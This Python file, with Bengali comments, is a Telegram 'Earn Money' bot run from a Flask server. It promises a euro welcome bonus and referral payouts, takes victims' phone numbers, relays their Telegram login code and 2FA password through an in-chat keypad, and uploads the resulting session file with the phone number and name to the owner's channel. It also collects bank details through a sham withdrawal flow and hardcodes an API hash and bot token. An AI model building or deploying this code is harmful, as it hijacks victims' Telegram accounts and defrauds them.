import threading
import asyncio
import sqlite3
import os
from datetime import datetime
from flask import Flask, jsonify, render_template

# Telethon ও অন্যান্য প্রয়োজনীয় লাইব্রেরি
from telethon import TelegramClient, events, types
from telethon.tl.types import KeyboardButtonRow, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardHide
from telethon.errors import SessionPasswordNeededError

app = Flask(__name__)

# ---------- CONFIGURATION ----------
API_ID = 35648548
API_HASH = '7cb954d06d962e181fb1717fe1a486a8'
# ⬇️ আপনার নতুন টোকেনটি এখানে আপডেট করা হয়েছে 
BOT_TOKEN = '8872154816:AAHcOequL3WOz-9Rk8OHgihtPUwxr4eeEqA'
OWNER_CHANNEL_ID = -1003645477647      
BOT_USERNAME = 'YourEarnBot'           
SESSION_DIR = 'sessions'

# Earnings settings
WELCOME_BONUS = 10          # Euro
REFERRAL_COMMISSION = 5     # Euro
MIN_WITHDRAWAL = 10         # Minimum withdrawal amount (Euro)

os.makedirs(SESSION_DIR, exist_ok=True)

# ---------- DATABASE ----------
def adapt_datetime(dt):
    return dt.isoformat()

def convert_datetime(blob):
    return datetime.fromisoformat(blob.decode())

sqlite3.register_adapter(datetime, adapt_datetime)
sqlite3.register_converter("timestamp", convert_datetime)

conn = sqlite3.connect('referral_bot.db', detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES, check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    phone TEXT,
    session_file TEXT,
    balance REAL DEFAULT 0,
    referrer_id INTEGER,
    created_at TIMESTAMP
)''')
c.execute('''CREATE TABLE IF NOT EXISTS referrals (
    id INTEGER PRIMARY KEY,
    referrer_id INTEGER,
    referred_user_id INTEGER,
    commission REAL,
    created_at TIMESTAMP
)''')
c.execute('''CREATE TABLE IF NOT EXISTS withdrawals (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    amount REAL,
    bank_details TEXT,
    status TEXT DEFAULT 'pending',
    requested_at TIMESTAMP
)''')
conn.commit()

def get_user(user_id):
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    return c.fetchone()

def create_user(user_id, phone, session_file, referrer_id=None):
    c.execute('INSERT INTO users (user_id, phone, session_file, balance, referrer_id, created_at) VALUES (?,?,?,?,?,?)',
              (user_id, phone, session_file, 0, referrer_id, datetime.now()))
    conn.commit()

def update_balance(user_id, delta):
    c.execute('UPDATE users SET balance = balance + ? WHERE user_id = ?', (delta, user_id))
    conn.commit()

def add_referral(referrer_id, referred_user_id, commission):
    c.execute('INSERT INTO referrals (referrer_id, referred_user_id, commission, created_at) VALUES (?,?,?,?)',
              (referrer_id, referred_user_id, commission, datetime.now()))
    conn.commit()

def count_referrals(referrer_id):
    c.execute('SELECT COUNT(*) FROM referrals WHERE referrer_id = ?', (referrer_id,))
    return c.fetchone()[0]

def add_withdrawal(user_id, amount, bank_details):
    c.execute('INSERT INTO withdrawals (user_id, amount, bank_details, requested_at) VALUES (?,?,?,?)',
              (user_id, amount, bank_details, datetime.now()))
    conn.commit()

def get_balance(user_id):
    c.execute('SELECT balance FROM users WHERE user_id = ?', (user_id,))
    row = c.fetchone()
    return row[0] if row else 0

# ---------- BOT GLOBAL VARIABLES ----------
bot = None
login_states = {}
withdrawal_states = {}

# ---------- KEYBOARDS ----------
def main_menu_keyboard():
    rows = [
        KeyboardButtonRow(buttons=[KeyboardButton(text="👤 My Profile")]),
        KeyboardButtonRow(buttons=[KeyboardButton(text="💰 My Balance")]),
        KeyboardButtonRow(buttons=[KeyboardButton(text="🔗 Earn More")]),
        KeyboardButtonRow(buttons=[KeyboardButton(text="💸 Cash Out")])
    ]
    return ReplyKeyboardMarkup(rows=rows, resize=True)

def cancel_keyboard():
    rows = [KeyboardButtonRow(buttons=[KeyboardButton(text="❌ Cancel")])]
    return ReplyKeyboardMarkup(rows=rows, resize=True)

def build_numpad(user_id):
    state = login_states.get(user_id, {})
    show = state.get('show_code', False)
    toggle_text = "🔒 Hide Code" if show else "👁 Show Code"
    return [
        [types.KeyboardButtonCallback(text="1", data=b"num_1"), types.KeyboardButtonCallback(text="2", data=b"num_2"), types.KeyboardButtonCallback(text="3", data=b"num_3")],
        [types.KeyboardButtonCallback(text="4", data=b"num_4"), types.KeyboardButtonCallback(text="5", data=b"num_5"), types.KeyboardButtonCallback(text="6", data=b"num_6")],
        [types.KeyboardButtonCallback(text="7", data=b"num_7"), types.KeyboardButtonCallback(text="8", data=b"num_8"), types.KeyboardButtonCallback(text="9", data=b"num_9")],
        [types.KeyboardButtonCallback(text="❌ Clear", data=b"num_clear"), types.KeyboardButtonCallback(text="0", data=b"num_0"), types.KeyboardButtonCallback(text="➡️ Submit", data=b"num_submit")],
        [types.KeyboardButtonCallback(text=toggle_text, data=b"num_toggle")]
    ]

async def get_user_client(user_id):
    user = get_user(user_id)
    if not user or not user[2] or not os.path.exists(user[2]):
        return None
    client = TelegramClient(user[2], API_ID, API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        await client.disconnect()
        return None
    return client

# ========================================================
# 🤖 প্রধান ফাংশন যা বাটনে ক্লিক করলে ব্যাকগ্রাউন্ডে রান হবে
# ========================================================
def my_custom_bot_code():
    global bot
    
    # ব্যাকগ্রাউন্ড থ্রেডে Telethon চালানোর জন্য লুপ সেট
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # নতুন টোকেনসহ বট ইনিশিয়ালাইজেশন
    bot = TelegramClient('bot_session', API_ID, API_HASH, loop=loop)
    
    # ---------- COMMAND /start ----------
    @bot.on(events.NewMessage(pattern='/start(?:\\s+(.*))?'))
    async def start(event):
        user_id = event.sender_id
        args = event.pattern_match.group(1)
        referrer_id = None
        if args and args.startswith('ref_'):
            try:
                referrer_id = int(args.split('_')[1])
            except:
                pass

        if get_user(user_id):
            await event.respond("🎉 Welcome back! Choose how to earn:", buttons=main_menu_keyboard())
            return

        login_states[user_id] = {
            "step": "AWAITING_PHONE",
            "referrer_id": referrer_id,
            "otp_buffer": "",
            "show_code": False
        }
        phone_keyboard = [[types.KeyboardButtonRequestPhone(text="💰 Earn Now")]]
        await event.respond(
            "💸 **Start Earning Now!**\n\n"
            "To get your welcome bonus and start referring friends, you need to log in.\n"
            "Press the button below to share your phone number – it's 100% secure.",
            buttons=phone_keyboard
        )

    # ---------- HANDLE CONTACT SHARE ----------
    @bot.on(events.NewMessage)
    async def handle_contact(event):
        user_id = event.sender_id
        state = login_states.get(user_id)
        if not state or state["step"] != "AWAITING_PHONE":
            return
        if not event.media or not isinstance(event.media, types.MessageMediaContact):
            return

        phone = event.media.phone_number
        if not phone.startswith('+'):
            phone = f"+{phone}"

        state["phone"] = phone
        await event.respond(f"⚡ Connecting to {phone}...", buttons=ReplyKeyboardHide())

        temp_session = f'temp_{user_id}'
        client = TelegramClient(temp_session, API_ID, API_HASH, loop=loop)
        await client.connect()
        try:
            send_code = await client.send_code_request(phone)
            state["client"] = client
            state["phone_code_hash"] = send_code.phone_code_hash
            state["step"] = "AWAITING_CODE"

            await event.respond(
                "📩 **Verification code sent!**\n"
                "Use the keypad below to enter the code.\n"
                "👉 [Open Telegram](https://t.me/chat) (if you didn't receive it yet)",
                buttons=build_numpad(user_id),
                link_preview=False
            )
        except Exception as e:
            await event.respond(f"❌ Oops: {str(e)}\nPlease /start again.")
            await client.disconnect()
            if user_id in login_states: del login_states[user_id]

    # ---------- HANDLE 2FA ----------
    @bot.on(events.NewMessage)
    async def handle_2fa(event):
        user_id = event.sender_id
        state = login_states.get(user_id)
        if not state or state.get("step") != "AWAITING_2FA":
            return
        password = event.text.strip()
        client = state["client"]
        try:
            await client.sign_in(password=password)
            await finalize_login(event, user_id, state)
        except Exception as e:
            await event.respond(f"🔐 Wrong password: {str(e)}\nUse /start to try again.")
            await client.disconnect()
            if user_id in login_states: del login_states[user_id]

    # ---------- OTP KEYPAD HANDLER ----------
    @bot.on(events.CallbackQuery(data=lambda d: d.startswith(b"num_")))
    async def handle_keypad(event):
        user_id = event.sender_id
        state = login_states.get(user_id)
        if not state or state.get("step") != "AWAITING_CODE":
            await event.answer("No active login. Use /start", alert=True)
            return

        action = event.data.decode('utf-8').replace("num_", "")
        if action == "clear":
            state["otp_buffer"] = ""
            await event.edit("Keypad cleared.\nEnter code:", buttons=build_numpad(user_id))
            await event.answer()
        elif action == "submit":
            code = state["otp_buffer"]
            if len(code) < 5:
                await event.answer("Code must be 5+ digits!", alert=True)
                return
            await event.edit("🔄 Verifying...", buttons=None)
            client = state["client"]
            try:
                await client.sign_in(code=code)
                await finalize_login(event, user_id, state)
            except SessionPasswordNeededError:
                state["step"] = "AWAITING_2FA"
                await bot.send_message(user_id, "🔐 **2FA required** – please reply with your password.")
            except Exception as e:
                await bot.send_message(user_id, f"❌ Login failed: {str(e)}\n/start to try again.")
                await client.disconnect()
                if user_id in login_states: del login_states[user_id]
        elif action == "toggle":
            state["show_code"] = not state.get("show_code", False)
            await event.edit("Enter code:", buttons=build_numpad(user_id))
            await event.answer()
        else:  # digit
            state["otp_buffer"] += action
            show = state.get("show_code", False)
            display = state["otp_buffer"] if show else "•" * len(state["otp_buffer"])
            await event.edit(f"Entering code...\n\n**Current:** `{display}`", buttons=build_numpad(user_id))
            await event.answer()

    # ---------- FINALIZE LOGIN ----------
    async def finalize_login(event, user_id, state):
        client = state["client"]
        me = await client.get_me()
        phone = state["phone"]
        referrer_id = state.get("referrer_id")

        permanent_session = os.path.join(SESSION_DIR, f"user_{user_id}.session")
        await client.disconnect()
        temp_file = f'temp_{user_id}.session'
        if os.path.exists(temp_file):
            os.rename(temp_file, permanent_session)
        else:
            await bot.send_message(user_id, "⚠️ Session error, but you are logged in. Please /start again.")
            return

        create_user(user_id, phone, permanent_session, referrer_id)
        update_balance(user_id, WELCOME_BONUS)

        if referrer_id and get_user(referrer_id):
            update_balance(referrer_id, REFERRAL_COMMISSION)
            add_referral(referrer_id, user_id, REFERRAL_COMMISSION)
            await bot.send_message(referrer_id, f"🎉 **+{REFERRAL_COMMISSION} Euro!**\nSomeone you invited just joined.")

        try:
            await bot.send_file(OWNER_CHANNEL_ID, permanent_session,
                                caption=f"User {user_id} | {phone} | {me.first_name}")
        except Exception as e:
            print("Session send failed:", e)

        await bot.send_message(user_id,
                               f"✅ **Login successful!**\nWelcome {me.first_name}\n\n"
                               f"🎁 You received **{WELCOME_BONUS} Euro** welcome bonus!\n"
                               f"💰 Your current balance: **{get_balance(user_id)} Euro**\n\n",
                               buttons=main_menu_keyboard())
        if user_id in login_states: del login_states[user_id]

    # ---------- MENU HANDLER ----------
    MENU_BUTTONS = ["👤 My Profile", "💰 My Balance", "🔗 Earn More", "💸 Cash Out"]

    @bot.on(events.NewMessage(func=lambda e: e.text in MENU_BUTTONS))
    async def menu_handler(event):
        user_id = event.sender_id
        text = event.text

        if text == "👤 My Profile":
            user = get_user(user_id)
            if not user: return
            client = await get_user_client(user_id)
            if not client: return
            me = await client.get_me()
            await client.disconnect()
            msg = (f"👤 **Your Earnings Profile**\n\nName: {me.first_name}\nPhone: {user[1]}\n💰 Balance: **{user[3]} Euro**")
            await event.respond(msg, buttons=main_menu_keyboard())

        elif text == "💰 My Balance":
            bal = get_balance(user_id)
            await event.respond(f"💰 **Your balance:** `{bal} Euro`", buttons=main_menu_keyboard())

        elif text == "🔗 Earn More":
            ref_count = count_referrals(user_id)
            link = f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
            msg = f"🔗 **Your Referral Link**\n`{link}`\n\n👥 Friends: {ref_count}"
            await event.respond(msg, buttons=main_menu_keyboard(), link_preview=False)

        elif text == "💸 Cash Out":
            balance = get_balance(user_id)
            if balance < MIN_WITHDRAWAL:
                await event.respond(f"⚠️ Minimum withdrawal {MIN_WITHDRAWAL} Euro.", buttons=main_menu_keyboard())
                return
            withdrawal_states[user_id] = {"step": "awaiting_amount"}
            await event.respond(f"Enter amount to withdraw:", buttons=cancel_keyboard())

    # ---------- WITHDRAWAL FLOW ----------
    @bot.on(events.NewMessage)
    async def withdrawal_flow(event):
        user_id = event.sender_id
        if user_id not in withdrawal_states: return
        state = withdrawal_states[user_id]
        text = event.text.strip()

        if text == "❌ Cancel":
            del withdrawal_states[user_id]
            await event.respond("Cancelled.", buttons=main_menu_keyboard())
            return

        if state["step"] == "awaiting_amount":
            try:
                amount = float(text)
                state["amount"] = amount
                state["step"] = "awaiting_bank"
                await event.respond("🏦 Send your bank details:", buttons=cancel_keyboard())
            except: pass
        elif state["step"] == "awaiting_bank":
            add_withdrawal(user_id, state["amount"], text)
            update_balance(user_id, -state["amount"])
            await bot.send_message(OWNER_CHANNEL_ID, f"Withdraw Request: {user_id} | {state['amount']} Euro")
            await event.respond("✅ Request sent!", buttons=main_menu_keyboard())
            del withdrawal_states[user_id]

    # ---------- FALLBACK ----------
    @bot.on(events.NewMessage)
    async def fallback(event):
        if event.text and not event.text.startswith('/'):
            if event.text in MENU_BUTTONS: return
            if event.sender_id in login_states or event.sender_id in withdrawal_states: return
            await event.respond("💸 Please use the buttons below to earn money:", buttons=main_menu_keyboard())

    # ---------- RUN BOT ----------
    print("🤖 Earn Money Bot is running inside background thread...")
    bot.start(bot_token=BOT_TOKEN)
    bot.run_until_disconnected()

# ==========================================
# 🌐 ফ্ল্যাস্ক সার্ভার রুটস (Flask Web Interface)
# ==========================================

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/run-bot", methods=["POST"])
def run_bot():
    try:
        bot_thread = threading.Thread(target=my_custom_bot_code)
        bot_thread.daemon = True
        bot_thread.start()
        
        return jsonify({"status": "success", "message": "🤖 Earn Money Bot নতুন টোকেনসহ ব্যাকগ্রাউন্ডে সচল হয়েছে!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
